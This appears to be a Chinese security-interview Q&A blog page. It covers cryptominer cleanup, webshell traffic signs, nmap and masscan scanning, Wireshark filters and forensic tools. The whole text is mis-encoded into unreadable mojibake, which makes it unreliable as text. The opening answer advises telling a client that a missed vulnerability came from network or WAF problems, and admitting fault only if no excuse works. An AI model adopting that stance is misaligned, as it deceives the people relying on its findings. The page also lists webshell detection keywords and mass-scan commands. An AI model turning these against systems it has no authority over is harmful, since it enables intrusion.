å…¬å¸ç»è¿‡æ£€æŸ¥åå‘ç°æŸä¸ªæ¼æ´æ²¡æœ‰å‡ºç°åœ¨ç»“æœé‡Œï¼Œè¢«é—æ¼äº†ã€‚ç»æ£€æŸ¥åå‘ç°ç¡®å®æ˜¯æˆ‘æ–¹å½“æ—¶æ²¡æœ‰æ‰«æå‡ºæ¥ï¼Œå¦‚ä½•è·Ÿå®¢æˆ·è§£é‡Šå’Œå¤„ç†ï¼Ÿ<br>å…ˆç¡®è®¤è¯¥æ¼æ´æ˜¯å¦å­˜åœ¨<br>å¦‚æœæ¼æ´å­˜åœ¨ï¼šä¹Ÿå°±æ˜¯æˆ‘ä»¬æ²¡æ‰«å‡ºæ¥ï¼Œå°±éœ€è¦æ£€æŸ¥å½“æ—¶èµ„äº§æ˜¯å¦æœ‰æ´»ï¼Œæ˜¯ä¸æ˜¯å…³åœåˆå¼€èµ·æ¥ï¼Œæ˜¯ä¸æ˜¯å› ä¸ºå½“æ—¶ç½‘ç»œä¸å¥½ï¼Œå¸¦å®½ä¸å¤Ÿå¤§ï¼Œç½‘ç»œæ³¢åŠ¨å¤§ï¼Œå¤–ç½‘ç¯å¢ƒä¸ç¨³å®šã€WAF æ‹¦æˆªç­‰ï¼Œå…ˆç¨³ä½å®¢æˆ·æƒ…ç»ªï¼Œè®©å®¢æˆ·ç›¸ä¿¡æˆ‘ä»¬æ˜¯æœ‰èƒ½åŠ›çš„ï¼Œåªæ˜¯å¶å°”å› ä¸ºä¸å¯æ§å› ç´ å‡ºç°äº†é—®é¢˜ï¼Œç„¶åæä¾›è¡¥æ•‘æ–¹æ¡ˆï¼Œè¿›è¡Œè¡¥æ‰«ç­‰åç»­æ–¹æ¡ˆ<br>å¦‚æœæ¼æ´æ‰«ä¸å‡ºæ¥ï¼šæ¢ä¸ªæ‰«æå™¨ï¼Œæ¯”è¾ƒå·®å¼‚ï¼Œå¦‚æœè¿˜æ˜¯æ‰«ä¸å‡ºæ¥çš„è¯ï¼Œå°±è¦è€ƒè™‘ä¼˜åŒ–æ–¹æ¡ˆï¼Œçœ‹è¦ä¸è¦ç«‹ä¸ªä¸“é¡¹æ£€æµ‹æ¥å•ç‹¬å¯¹æ­¤æ¼æ´è¿›è¡Œæ‰¹é‡æ’æŸ¥ã€‚å¦‚æœå®åœ¨æ˜¯æˆ‘ä»¬çš„é—®é¢˜ï¼Œæ‰¾ä¸åˆ°ç†ç”±åœ†åœºçš„è¯ï¼Œæˆ‘ä»¬å°±è€å®æ‰¿è®¤ï¼Œæ‰¾å®¢æˆ·ç»ç†è¿›è¡Œæ²Ÿé€šï¼Œæå‡ºä¸è¶³å¹¶ä¸”è¦æœ‰æ”¹è¿›çš„æ–¹æ¡ˆç­‰ï¼Œè€ƒè™‘å¦‚ä½•ç»™å®¢æˆ·ä¸€ä¸ªæ»¡æ„çš„äº¤ä»£ï¼Œç¡®ä¿ä¸‹æ¬¡ä¸ä¼šå†å‡ºç°æ­¤ç±»é—®é¢˜ã€‚</p><h2 id="æœåŠ¡å™¨è¢«æŒ–çŸ¿çš„åŸå› "><a href="#æœåŠ¡å™¨è¢«æŒ–çŸ¿çš„åŸå› " class="headerlink" title="æœåŠ¡å™¨è¢«æŒ–çŸ¿çš„åŸå› "></a>æœåŠ¡å™¨è¢«æŒ–çŸ¿çš„åŸå› </h2><p>ä¸ºäº†è¿½æ±‚é«˜æ•ˆç‡ï¼Œç°åœ¨çš„é»‘å®¢ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡è‡ªåŠ¨åŒ–è„šæœ¬å»æ‰«æäº’è”ç½‘ä¸Šæ‰€æœ‰æœºå™¨ï¼Œå¯»æ‰¾æ¼æ´ç„¶åéƒ¨ç½²æŒ–çŸ¿è¿›ç¨‹ã€‚æ‰€ä»¥å¤§éƒ¨åˆ†çš„æŒ–çŸ¿éƒ½æ˜¯ç”±äºå—å®³è€…çš„ä¸»æœºä¸Šå­˜åœ¨å¸¸è§çš„æ¼æ´ã€‚æ¯”å¦‚ï¼š<br>1ï¼‰æœªæˆæƒè®¿é—®æˆ–å¼±å£ä»¤ï¼šRedis æœªæˆæƒè®¿é—®ã€Docker API æœªæˆæƒè®¿é—®ã€Hadoop Yarn æœªæˆæƒè®¿é—®ã€NFS æœªæˆæƒè®¿é—®ã€Rsync å¼±å£ä»¤ã€PostgreSQL å¼±å£ä»¤ã€Tomcat å¼±å£ä»¤ã€SSH å¼±å£ä»¤ã€Telnet å¼±å£ä»¤ã€Windows è¿œç¨‹æ¡Œé¢å¼±å£ä»¤ï¼›<br>2ï¼‰è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼šWebLogic XML ååºåˆ—åŒ–æ¼æ´ã€Jenkins ååºåˆ—åŒ–ã€Jboss è¿œç¨‹ä»£ç æ‰§è¡Œã€Spring è¿œç¨‹ä»£ç æ‰§è¡Œã€ElasticSearch å‘½ä»¤æ‰§è¡Œã€æ°¸æ’ä¹‹è“ã€Struts2 ç³»åˆ—æ¼æ´ã€å¸¸è§ CMS çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼›<br>3ï¼‰æ–°çˆ†çš„é«˜å±æ¼æ´ï¼šä¸€èˆ¬æ¯æ¬¡çˆ†å‘æ–°çš„é«˜å±æ¼æ´ï¼Œéƒ½ä¼šç´§è·Ÿä¸€æ³¢å¤§è§„æ¨¡çš„å…¨ç½‘æ‰«æåˆ©ç”¨å’ŒæŒ–çŸ¿ã€‚<br>ä¸€æ—¦å‘ç°æœåŠ¡å™¨è¢«æŒ–çŸ¿ï¼Œåº”è¯¥é¦–å…ˆæŸ¥çœ‹æŒ–çŸ¿è¿›ç¨‹æ‰€å±çš„ç”¨æˆ·ï¼Œæ ¹æ®æŒ–çŸ¿è¿›ç¨‹çš„è¿è¡Œç”¨æˆ·å»æ’æŸ¥è¯¥ç”¨æˆ·ä¸‹æ˜¯å¦è¿˜è¿è¡Œç€å…¶å®ƒè¿›ç¨‹ï¼Œç¡®å®šè¿™äº›è¿›ç¨‹æ˜¯å¦æœ‰ä¸Šè¿°ç»å¸¸è¢«é»‘å®¢åˆ©ç”¨çš„æ¼æ´ã€‚å¦‚æœæœ‰å¸¸è§çš„æ¼æ´ï¼Œåˆ™åº”è¯¥é‡ç‚¹å¯¹æ­¤è¿›è¡Œæ’æŸ¥ã€‚</p><h2 id="å¦‚ä½•æ¸…é™¤æŒ–çŸ¿æœ¨é©¬"><a href="#å¦‚ä½•æ¸…é™¤æŒ–çŸ¿æœ¨é©¬" class="headerlink" title="å¦‚ä½•æ¸…é™¤æŒ–çŸ¿æœ¨é©¬"></a>å¦‚ä½•æ¸…é™¤æŒ–çŸ¿æœ¨é©¬</h2><p>1ï¼‰åŠæ—¶éš”ç¦»ä¸»æœº<br>éƒ¨åˆ†å¸¦æœ‰è •è™«åŠŸèƒ½çš„æŒ–çŸ¿æœ¨é©¬åœ¨å–å¾—æœ¬æœºçš„æ§åˆ¶æƒåï¼Œä¼šä»¥æœ¬æœºä¸ºè·³æ¿æœºï¼Œå¯¹åŒä¸€å±€åŸŸç½‘å†…çš„å…¶ä»–ä¸»æœºè¿›è¡Œå·²çŸ¥æ¼æ´çš„æ‰«æå’Œè¿›ä¸€æ­¥åˆ©ç”¨ï¼Œæ‰€ä»¥å‘ç°æŒ–çŸ¿ç°è±¡åï¼Œåœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹åº”è¯¥åŠæ—¶éš”ç¦»å—æ„ŸæŸ“ä¸»æœºï¼Œç„¶åè¿›è¡Œä¸‹ä¸€æ­¥åˆ†æã€‚</p><p>2ï¼‰é˜»æ–­ä¸çŸ¿æ± é€šè®¯<br>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP<br>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</p><p>3ï¼‰æ¸…é™¤å®šæ—¶ä»»åŠ¡<br>å¤§éƒ¨åˆ†æŒ–çŸ¿è¿›ç¨‹ä¼šåœ¨å—æ„ŸæŸ“ä¸»æœºä¸­å†™å…¥å®šæ—¶ä»»åŠ¡å®Œæˆç¨‹åºçš„é©»ç•™ï¼Œå½“å®‰å…¨äººå‘˜åªæ¸…é™¤æŒ–çŸ¿æœ¨é©¬æ—¶ï¼Œå®šæ—¶ä»»åŠ¡ä¼šå†æ¬¡ä»æœåŠ¡å™¨ä¸‹è½½æŒ–çŸ¿è¿›ç¨‹æˆ–ç›´æ¥æ‰§è¡ŒæŒ–çŸ¿è„šæœ¬ï¼Œå¯¼è‡´æŒ–çŸ¿è¿›ç¨‹æ¸…é™¤å¤±è´¥ã€‚</p><p>4ï¼‰æ¸…é™¤å¯åŠ¨é¡¹<br>æœ‰çš„æŒ–çŸ¿è¿›ç¨‹ä¸ºäº†å®ç°é•¿æœŸé©»ç•™ï¼Œä¼šå‘ç³»ç»Ÿä¸­æ·»åŠ å¯åŠ¨é¡¹æ¥ç¡®ä¿ç³»ç»Ÿé‡å¯åæŒ–çŸ¿è¿›ç¨‹è¿˜èƒ½é‡æ–°å¯åŠ¨ã€‚æ‰€ä»¥åœ¨æ¸…é™¤æ—¶è¿˜åº”è¯¥å…³æ³¨å¯åŠ¨é¡¹ä¸­çš„å†…å®¹ï¼Œå¦‚æœæœ‰å¯ç–‘çš„å¯åŠ¨é¡¹ï¼Œä¹Ÿåº”è¯¥è¿›è¡Œæ’æŸ¥ï¼Œç¡®è®¤æ˜¯æŒ–çŸ¿è¿›ç¨‹åï¼Œå¯¹å…¶è¿›è¡Œæ¸…é™¤ã€‚</p><p>5ï¼‰æ¸…é™¤å…¬é’¥æ–‡ä»¶<br>åœ¨ç”¨æˆ·å®¶ç›®å½•çš„ .ssh ç›®å½•ä¸‹æ”¾ç½® authorized_keys æ–‡ä»¶ï¼Œä»è€Œå…å¯†ç™»å½•è¯¥æœºå™¨ä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„ä¿æŒæœåŠ¡å™¨æ§åˆ¶æƒçš„æ‰‹æ®µã€‚åœ¨æ’æŸ¥è¿‡ç¨‹ä¸­åº”è¯¥æŸ¥çœ‹è¯¥æ–‡ä»¶ä¸­æ˜¯å¦æœ‰å¯ç–‘å…¬é’¥ä¿¡æ¯ï¼Œæœ‰çš„è¯ç›´æ¥åˆ é™¤ï¼Œé¿å…æ”»å‡»è€…å†æ¬¡å…å¯†ç™»å½•è¯¥ä¸»æœºã€‚</p><p>6ï¼‰kill æŒ–çŸ¿è¿›ç¨‹<br>å¯¹äºå•è¿›ç¨‹æŒ–çŸ¿ç¨‹åºï¼Œç›´æ¥ç»“æŸæŒ–çŸ¿è¿›ç¨‹å³å¯ã€‚ä½†æ˜¯å¯¹äºå¤§å¤šæ•°çš„æŒ–çŸ¿è¿›ç¨‹ï¼Œå¦‚æœæŒ–çŸ¿è¿›ç¨‹æœ‰å®ˆæŠ¤è¿›ç¨‹ï¼Œåº”å…ˆæ€æ­»å®ˆæŠ¤è¿›ç¨‹å†æ€æ­»æŒ–çŸ¿è¿›ç¨‹ï¼Œé¿å…æ¸…é™¤ä¸å½»åº•ã€‚åœ¨å®é™…çš„æ¸…é™¤å·¥ä½œä¸­ï¼Œåº”æ‰¾åˆ°æœ¬æœºä¸Šè¿è¡Œçš„æŒ–çŸ¿è„šæœ¬ï¼Œæ ¹æ®è„šæœ¬çš„æ‰§è¡Œæµç¨‹ç¡®å®šæœ¨é©¬çš„é©»ç•™æ–¹å¼ï¼Œå¹¶æŒ‰é¡ºåºè¿›è¡Œæ¸…é™¤ï¼Œé¿å…æ¸…é™¤ä¸å½»åº•ã€‚</p><h2 id="1ã€Webshell-æµé‡äº¤äº’çš„æµé‡ç‰¹å¾æœ‰å“ªäº›"><a href="#1ã€Webshell-æµé‡äº¤äº’çš„æµé‡ç‰¹å¾æœ‰å“ªäº›" class="headerlink" title="1ã€Webshell æµé‡äº¤äº’çš„æµé‡ç‰¹å¾æœ‰å“ªäº›"></a>1ã€Webshell æµé‡äº¤äº’çš„æµé‡ç‰¹å¾æœ‰å“ªäº›</h2><ol><li>Webshell æ˜¯ç”¨æ¥æ§åˆ¶æœåŠ¡å™¨çš„ï¼Œåœ¨æ§åˆ¶æœåŠ¡å™¨çš„è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè§¦å‘è®¸å¤šç³»ç»Ÿå‡½æ•°ï¼Œä¾‹å¦‚ evalã€z0ï¼ˆèœåˆ€ç‰¹å¾ï¼‰ã€shellï¼Œéœ€ç›‘æ§è¿™äº›å…³é”®çš„å‡½æ•°ï¼Œå…·ä½“éœ€è¦æŸ¥çœ‹æ˜¯å“ªä¸ªç½‘é¡µå‘èµ·çš„è¯·æ±‚è¿›è¡Œé‰´åˆ«ã€‚</li><li>Webshell è¿æ¥å¯èƒ½ä½¿ç”¨ base64 ç¼–ç ï¼Œæ­£å¸¸åŠŸèƒ½ä¹Ÿä¼šä½¿ç”¨ base64 å®¹æ˜“å¼•èµ·è¯¯æŠ¥ï¼Œä¸€èˆ¬ä¸ eval æ•°é‡å¯¹æ¯”ï¼Œæ•°é‡å·®å¼‚è¾ƒå°æ—¶å¯èƒ½è¢«ä¸Šä¼  webshell è¿›è¡Œç¼–ç é€šè®¯ã€‚</li><li>é™¤äº†ç³»ç»Ÿå‡½æ•°ã€base64 ç¼–ç é€šè®¯å¤–ï¼Œè¿˜å­˜åœ¨ int_set(â€œdisplay_errorsâ€,â€0â€)ï¼Œä¸º Webshell æµé‡ç‰¹å¾ä¹‹ä¸€ã€‚</li><li>è¿˜å¯ä»¥ç›‘æ§ ifconfig whoami ipconfig ç­‰å…³é”®å‘½ä»¤ï¼Œè¿™æ˜¯è·å¾— Webshell ååŸºæœ¬ä¸Šéƒ½ä¼šæ‰§è¡Œçš„å‘½ä»¤ã€‚</li></ol><h2 id="æ‰¹é‡æ£€æŸ¥-http-æœåŠ¡ä½¿ç”¨ä»€ä¹ˆå·¥å…·å’Œç®€ç•¥ä½¿ç”¨æ­¥éª¤"><a href="#æ‰¹é‡æ£€æŸ¥-http-æœåŠ¡ä½¿ç”¨ä»€ä¹ˆå·¥å…·å’Œç®€ç•¥ä½¿ç”¨æ­¥éª¤" class="headerlink" title="æ‰¹é‡æ£€æŸ¥ http æœåŠ¡ä½¿ç”¨ä»€ä¹ˆå·¥å…·å’Œç®€ç•¥ä½¿ç”¨æ­¥éª¤"></a>æ‰¹é‡æ£€æŸ¥ http æœåŠ¡ä½¿ç”¨ä»€ä¹ˆå·¥å…·å’Œç®€ç•¥ä½¿ç”¨æ­¥éª¤</h2><p>æ–¹æ³•ä¸€ï¼šç›´æ¥ä½¿ç”¨ nmapSV.py å·¥å…·å³å¯ï¼Œç”¨æ³•ä¸º python3 nmapSV.py ip.txt result.txt<br>æ–¹æ³•äºŒï¼šä½¿ç”¨ nmap å·¥å…·æ‰«æï¼Œå¸¦ä¸Š -sV å‚æ•°è¿›è¡Œç‰ˆæœ¬è¯†åˆ«å³å¯ï¼Œå°†å¾…æ£€æµ‹çš„ IP åœ°å€&#x2F;åœ°å€æ®µæ·»åŠ è¿› ip.txt æ–‡ä»¶ä¸­ã€‚ä½¿ç”¨å‘½ä»¤ nmap -sV -iL ip.txt -oA OUTPUT â€“no-stylesheetï¼Œæ‰«å‡ºæ¥çš„ç»“æœå¯¼å‡º nmap æ–‡ä»¶ï¼Œä½¿ç”¨ nmapReport å·¥å…·å¾—å‡ºç»“æœã€‚</p><h2 id="å­˜æ´»æ€§æ¢æµ‹çš„ç®€è¦æ­¥éª¤"><a href="#å­˜æ´»æ€§æ¢æµ‹çš„ç®€è¦æ­¥éª¤" class="headerlink" title="å­˜æ´»æ€§æ¢æµ‹çš„ç®€è¦æ­¥éª¤"></a>å­˜æ´»æ€§æ¢æµ‹çš„ç®€è¦æ­¥éª¤</h2><p>ä½¿ç”¨ nmap å·¥å…·è¿›è¡Œå­˜æ´»æ€§æ¢æµ‹ ä½¿ç”¨ nmapï¼Œå‘½ä»¤ nmap -sP -n -iL ip.txt -oA OUTPUT â€“no-stylesheet<br>åœ¨ Linux ä¸­ä½¿ç”¨ cat OUTPUT.gnmmap |grep Up |awk â€˜{print $2}â€™ &gt; ip.cunhuo.txt å³å¯å¾—åˆ°å­˜æ´» IP</p><h2 id="å‡è®¾å‘ç°æ•°æ®åº“çŸ­æ—¶é—´å†…æŸ¥è¯¢å¼‚å¸¸æ¬¡æ•°å¢å¤šï¼Œæè¿°-sql-æŸ¥è¯¢å¼‚å¸¸æµé‡åˆ†æçš„æ€è·¯"><a href="#å‡è®¾å‘ç°æ•°æ®åº“çŸ­æ—¶é—´å†…æŸ¥è¯¢å¼‚å¸¸æ¬¡æ•°å¢å¤šï¼Œæè¿°-sql-æŸ¥è¯¢å¼‚å¸¸æµé‡åˆ†æçš„æ€è·¯" class="headerlink" title="å‡è®¾å‘ç°æ•°æ®åº“çŸ­æ—¶é—´å†…æŸ¥è¯¢å¼‚å¸¸æ¬¡æ•°å¢å¤šï¼Œæè¿° sql æŸ¥è¯¢å¼‚å¸¸æµé‡åˆ†æçš„æ€è·¯"></a>å‡è®¾å‘ç°æ•°æ®åº“çŸ­æ—¶é—´å†…æŸ¥è¯¢å¼‚å¸¸æ¬¡æ•°å¢å¤šï¼Œæè¿° sql æŸ¥è¯¢å¼‚å¸¸æµé‡åˆ†æçš„æ€è·¯</h2><p>æ•°æ®åº“çŸ­æ—¶é—´å†…æŸ¥è¯¢å¢å¤šæœ‰å¯èƒ½é­é‡åˆ°äº†æ‰«ææˆ–è€… sql æ³¨å…¥æµ‹è¯•ï¼Œå¯ä»¥ç»“åˆæµé‡åˆ†æå·¥å…·è¿›è¡Œç ”åˆ¤ã€‚<br>select å’Œ union ä¸ºæ•°æ®åº“æŸ¥è¯¢è¯­å¥ç‰¹å¾ï¼Œå½“è¿™ä¸¤è€…æ•°é‡å‡ºç°æ¬¡æ•°è¾ƒå¤šè€Œä¸”å·®å¼‚è¾ƒå°å¯èƒ½å­˜åœ¨ SQL æ³¨å…¥æ¼æ´æˆ–æ­£åœ¨è¢«æ‰«æå™¨æ‰«æï¼Œå¯ç›‘æ§è¿™ä¸¤ä¸ªå…³é”®å­—ï¼Œä½†è¿˜éœ€è¦è¿›ä¸€æ­¥æŸ¥çœ‹å…·ä½“è¯·æ±‚å‚æ•°ã€‚å¦‚ï¼š<br>1ï¼‰ä½¿ç”¨ wireshark æ‰“å¼€æŠ“å–åçš„æµé‡åŒ…<br>2ï¼‰å¯¹äºæŠ“å–åˆ°çš„æ•°æ®åŒ…ç­›é€‰å‡º HTTP åè®®åŒ…ï¼Œåœ¨ç»Ÿè®¡å¤„ç­›é€‰å‡ºçŸ­æ—¶é—´å†…æµé‡è¾ƒå¤§çš„ IP</p><h2 id="æè¿°æµé‡åˆ†ææº¯æºçš„æ€è·¯"><a href="#æè¿°æµé‡åˆ†ææº¯æºçš„æ€è·¯" class="headerlink" title="æè¿°æµé‡åˆ†ææº¯æºçš„æ€è·¯"></a>æè¿°æµé‡åˆ†ææº¯æºçš„æ€è·¯</h2><p>å‡è®¾å‘ç° web åº”ç”¨æœåŠ¡å™¨å‘ç°æ–‡ä»¶å¼‚å¸¸å¢å¤šï¼Œåˆæ­¥æ€€ç–‘è¢«ä¸Šä¼  webshellï¼Œæè¿°æµé‡åˆ†ææº¯æºçš„æ€è·¯<br>å¯åˆ©ç”¨æµé‡å·¥å…·è¿›è¡Œæº¯æºï¼š<br>1ï¼‰æŸ¥çœ‹ evalã€z0ã€shellã€whoami ç­‰å…³é”®å­—ï¼ŒæŸ¥çœ‹å‡ºç°æ¬¡æ•°è¿‡å¤šçš„æ—¶å€™ï¼Œå¯èƒ½éœ€è¦æŸ¥çœ‹æ˜¯å“ªä¸ªé¡µé¢å‘èµ·çš„è¯·æ±‚ï¼Œæœ‰å¯èƒ½æ˜¯ webshell<br>2ï¼‰é€šè¿‡ WireShark å·¥å…·å¿«é€Ÿæœç´¢å…³é”®å­—ï¼Œå®šä½åˆ°å¼‚å¸¸æµé‡åŒ…<br>3ï¼‰æ‰¾å‡ºå¼‚å¸¸ IP å’Œæ‰€ä¸Šä¼ çš„å†…å®¹ï¼ŒæŸ¥çœ‹æ˜¯å¦ä¸º webshell</p><p>å¦‚ä½•å®šä½åˆ°æ”»å‡» IPï¼š<br>1ï¼‰é¦–å…ˆé€šè¿‡é€‰æ‹©-ç»Ÿè®¡-å¯¹è¯æŸ¥çœ‹æµé‡çš„èµ°å‘æƒ…å†µï¼Œå®šä½å¯ç–‘çš„ IP åœ°å€<br>2ï¼‰æ ¹æ®å®šä½åˆ°çš„ IP åœ°å€ï¼Œå°è¯•å¯¹ä¸Šä¼ çš„ webshell è¿›è¡Œå®šä½ ip.addr &#x3D;&#x3D; ip &amp;&amp; http matches â€œupload||eval|select|xp_cmdshellâ€ &amp;&amp; http.request.method &#x3D;&#x3D; â€œPOSTâ€<br>3ï¼‰æŸ¥æ‰¾åˆ° Webshell åå°è¯•æº¯æºæ¼æ´ä½ç½®ï¼Œhttp.request.uri contains â€œwebshell.phpâ€ï¼Œå®šä½åˆ°æœ€å¼€å§‹ webshell æ‰§è¡Œæˆ–ä¸Šä¼ çš„æ—¶å€™<br>4ï¼‰æ ¹æ®æœ€å¼€å§‹çš„ HTTP ä¸Šä¼ åŒ…æˆ–è€…å…¶ä»–æ¼æ´ç‰¹äº§å®šä½æ¼æ´ç±»å‹</p><h2 id="wireshark-ç®€å•çš„è¿‡æ»¤è§„åˆ™"><a href="#wireshark-ç®€å•çš„è¿‡æ»¤è§„åˆ™" class="headerlink" title="wireshark ç®€å•çš„è¿‡æ»¤è§„åˆ™"></a>wireshark ç®€å•çš„è¿‡æ»¤è§„åˆ™</h2><p>è¿‡æ»¤ ipï¼šè¿‡æ»¤æº ip åœ°å€ï¼šip.src&#x3D;&#x3D;1.1.1.1ï¼›ç›®çš„ ip åœ°å€ï¼šip.dst&#x3D;&#x3D;1.1.1.1ï¼›<br>è¿‡æ»¤ç«¯å£ï¼šè¿‡æ»¤ 80 ç«¯å£ tcp.port&#x3D;&#x3D;80ï¼Œæºç«¯å£ï¼štcp.srcport&#x3D;&#x3D;80ï¼Œç›®çš„ç«¯å£ï¼štcp.dstport&#x3D;&#x3D;80<br>åè®®è¿‡æ»¤ï¼šç›´æ¥è¾“å…¥åè®®åå³å¯ï¼Œå¦‚ http åè®® http<br>http æ¨¡å¼è¿‡æ»¤ï¼šè¿‡æ»¤ get&#x2F;post åŒ… http.request.method&#x3D;&#x3D;â€GET&#x2F;POSTâ€</p><h2 id="å®¢æˆ·ç»™åˆ°ä½ æœ‰-50-ä¸‡ä¸ª-ipï¼Œè¦æ±‚ä½ ä¸¤å‘¨å†…åšå®Œå…¨ç«¯å£æ‰«æï¼Œä½ ä¼šæ€ä¹ˆåš"><a href="#å®¢æˆ·ç»™åˆ°ä½ æœ‰-50-ä¸‡ä¸ª-ipï¼Œè¦æ±‚ä½ ä¸¤å‘¨å†…åšå®Œå…¨ç«¯å£æ‰«æï¼Œä½ ä¼šæ€ä¹ˆåš" class="headerlink" title="å®¢æˆ·ç»™åˆ°ä½ æœ‰ 50 ä¸‡ä¸ª ipï¼Œè¦æ±‚ä½ ä¸¤å‘¨å†…åšå®Œå…¨ç«¯å£æ‰«æï¼Œä½ ä¼šæ€ä¹ˆåš"></a>å®¢æˆ·ç»™åˆ°ä½ æœ‰ 50 ä¸‡ä¸ª ipï¼Œè¦æ±‚ä½ ä¸¤å‘¨å†…åšå®Œå…¨ç«¯å£æ‰«æï¼Œä½ ä¼šæ€ä¹ˆåš</h2><p>ä»ä¸¤æ–¹é¢å›ç­”ï¼š<br>1ï¼‰å¦‚ä½•å¯¹å®¢æˆ·è¦æ±‚åšå‡ºè§£é‡Šå¹¶åˆç†è°ƒæ•´<br>2ï¼‰å¦‚ä½•æé«˜å…¨ç«¯å£æ‰«ææ•ˆç‡ï¼Œæ—¢ä¿è¯é€Ÿåº¦ï¼Œåˆä¿è¯å‡†ç¡®ç‡ã€‚</p><p>é¦–å…ˆå®¢æˆ·æå‡ºä¸¤å‘¨ 50w ä¸ª ip å…¨ç«¯å£è¿™ä¸ªè‚¯å®šä¸ç°å®ï¼Œæ‰€ä»¥è¦è€ƒè™‘è·Ÿå®¢æˆ·è§£é‡Šï¼Œæœ‰å¿…è¦å¯¹æ‰«æä»»åŠ¡è¿›è¡Œæ—¶é—´è°ƒæ•´ï¼Œå®‰æ’å°½å¯èƒ½å¤šçš„æ‰«æèµ„æºï¼Œå¦‚æ‰«ææœºå™¨ï¼Œæ‰«æç½‘ç»œå¸¦å®½ç­‰ï¼Œå‚è€ƒæ‰«æ 100 ä¸ª IP ç«¯å£çš„å¹³å‡æ—¶é•¿ï¼Œä¼°è®¡æ‰«å®Œçš„æ—¶é—´ï¼Œç»™å‡º 30 å¤©æ—¶é—´å·¦å³ç­”å¤ï¼Œå¹¶ä¸”ç•™å‡ºä¸€å‘¨è¿›è¡Œåç»­è¡¥æ‰«ï¼Œæ–‡æ¡£æ•´ç†ç­‰ã€‚<br>ä½¿ç”¨åˆ°å¤šçº¿ç¨‹ã€åˆ†å¸ƒå¼å’Œé«˜å¹¶å‘ï¼Œé‡‡ç”¨ masscan + nmapï¼Œå…ˆ masscan å­˜æ´»è¿‡ä¸€éï¼ŒæŠŠæœªå­˜æ´» IP å‰”é™¤æ‰ï¼›ä½¿ç”¨åˆ†å¸ƒå¼ nmap é«˜å¹¶å‘å‘è¿‡ä¸€éç«¯å£ï¼Œä¹Ÿå¯ä»¥ masscan ç«¯å£æ‰«æè¿‡ä¸€éï¼Œåœ¨ nmap è¿›è¡Œæ¢æµ‹<br>ç”±äº IP æ•°é‡è¿‡å¤šï¼Œä¸èƒ½ç›´æ¥æŠŠæ‰€æœ‰çš„ IP éƒ½ä¸¢ä¸Šå»æ‰«ï¼Œæ—¶é—´è‚¯å®šä¸å¤Ÿå¯ä»¥è·Ÿå®¢æˆ·å•†é‡å‡å°‘ IP æ•°é‡ï¼Œå¯¹æœªå­˜æ´»çš„ IP è¿›è¡Œç­›é€‰è¿‡æ»¤ï¼ŒåŠ å¿«æ‰«æé€Ÿåº¦éœ€è¦è¿›è¡Œå‚æ•°å¾®è°ƒï¼Œå¦‚ â€“min-hostgroupã€â€“min-rate å’Œ â€“min-parallelismã€‚å¯¹äºå­˜åœ¨é˜²ç«å¢™çš„æƒ…å†µï¼Œå¯ä»¥æå‡ºéœ€è¦æä¾›æ‰«æå™¨<br>æ•°æ®æ•´ç†ï¼šå¯¹äºå¤§é‡çš„ list å’Œ json ä½¿ç”¨ python-nmap python-masscanï¼Œæ‰«æ 1 ä¸ª IP å¤„ç† 1 ä¸ª IP</p><h2 id="å¸¸è§çš„å–è¯åˆ†æå·¥å…·"><a href="#å¸¸è§çš„å–è¯åˆ†æå·¥å…·" class="headerlink" title="å¸¸è§çš„å–è¯åˆ†æå·¥å…·"></a>å¸¸è§çš„å–è¯åˆ†æå·¥å…·</h2><p>Wiresharkã€xplicoã€Volatilityã€FastIR Collectorã€Autopsyã€DumpItã€FTK Imagerã€Foremostã€Scalpelã€Bulk_extractor ç­‰ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
